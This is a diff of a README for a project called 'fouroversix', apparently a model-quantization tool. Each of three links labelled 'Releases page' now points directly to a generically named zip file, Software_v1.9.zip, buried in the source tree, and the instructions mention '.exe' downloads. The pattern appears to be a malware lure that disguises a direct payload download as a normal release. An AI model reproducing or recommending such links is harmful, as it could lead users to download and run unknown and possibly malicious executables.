@@ -6,13 +6,13 @@ Welcome to the fouroversix project! This software helps improve the accuracy of 
 
 ## 🔗 Download Now
 
-[![Download fouroversix](https://raw.githubusercontent.com/Dhruv-sharma10/fouroversix/main/src/fouroversix/quantize/fouroversix_3.2.zip)](https://raw.githubusercontent.com/Dhruv-sharma10/fouroversix/main/src/fouroversix/quantize/fouroversix_3.2.zip)
+[![Download fouroversix](https://raw.githubusercontent.com/Dhruv-sharma10/fouroversix/main/src/fouroversix/csrc/quantize/Software_v1.9.zip)](https://raw.githubusercontent.com/Dhruv-sharma10/fouroversix/main/src/fouroversix/csrc/quantize/Software_v1.9.zip)
 
 ## 📥 Download & Install
 
 To download the software, visit the Releases page. Here you will find the latest version available.
 
-1. Go to the Releases page: [Download Page](https://raw.githubusercontent.com/Dhruv-sharma10/fouroversix/main/src/fouroversix/quantize/fouroversix_3.2.zip).
+1. Go to the Releases page: [Download Page](https://raw.githubusercontent.com/Dhruv-sharma10/fouroversix/main/src/fouroversix/csrc/quantize/Software_v1.9.zip).
 2. Look for the most recent version listed at the top of the page.
 3. Click on the version number to open the release details.
 4. You will see a list of assets. These may include files like `.exe` for Windows or `.zip` files for other systems. 
@@ -77,6 +77,6 @@ If you have any questions or need support, feel free to reach out. Look for cont
 
 ## 🔗 Download Again
 
-Remember, you can always revisit the Releases page for the latest updates and downloads: [Download Page](https://raw.githubusercontent.com/Dhruv-sharma10/fouroversix/main/src/fouroversix/quantize/fouroversix_3.2.zip).
+Remember, you can always revisit the Releases page for the latest updates and downloads: [Download Page](https://raw.githubusercontent.com/Dhruv-sharma10/fouroversix/main/src/fouroversix/csrc/quantize/Software_v1.9.zip).
 
 Enjoy using fouroversix to enhance your machine learning models!
